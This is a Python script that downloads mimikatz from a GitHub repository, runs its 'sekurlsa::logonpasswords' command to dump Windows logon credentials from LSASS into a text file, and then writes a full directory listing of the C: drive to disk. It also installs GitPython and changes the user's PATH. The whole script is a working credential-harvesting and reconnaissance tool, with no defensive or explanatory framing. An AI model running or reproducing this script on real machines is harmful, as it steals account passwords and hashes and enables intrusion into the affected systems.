from git import Repo
from datetime import datetime
import subprocess
import sys
from pathlib import Path
import os

git_url = "https://github.com/ParrotSec/mimikatz"


def mimiPull():
    """
    this function will be the pulling and using of mimikatz
    :param name:
    :return:
    """

    temp_dir = os.getcwd()
    repo_dir = repoName(temp_dir)
    Repo.clone_from(git_url, repo_dir)
    mimiPath = repo_dir + "\\x64\\mimikatz.exe"
    print(repo_dir)
    my_file = Path(mimiPath)
    if my_file.is_file():
        print("mimikatz was downloaded to machine")
        lsass_dump_path = repo_dir + "\\" + "lsass_dump.txt"
        os.system("{} sekurlsa::logonpasswords > ".format(mimiPath) + lsass_dump_path)
        if os.path.exists(lsass_dump_path):
            print("mimikatz was used")
    temp = os.popen("dir /s /b c:\ > {}\cdirsTest.txt".format(repo_dir)).read()
    print("done")


def repoName(temp_dir):
    """
    create a repo to handel the files
    :param temp_dir:
    :return:
    """
    now = datetime.now()
    date_time = now.strftime("%m%d%Y%H%M%S")
    print("date and time:", date_time)
    repo_dir = temp_dir + date_time
    return repo_dir


def install():
    """
    this function will pip install git python
    :return:
    """
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "GitPython"])  # pip install the git library
        temp = os.popen("python -m pip show gitpython | findstr Location").read()  # show the location of the library
        splingLoc = temp.split()  # split the location
        temp2 = os.popen(
            'setx PATH "%PATH%;{}"'.format(splingLoc[1])).read()  # add the path to the enciorment variables
        print(temp2)
    except Exception as e:
        print("error --------", e)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    install()
    mimiPull()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
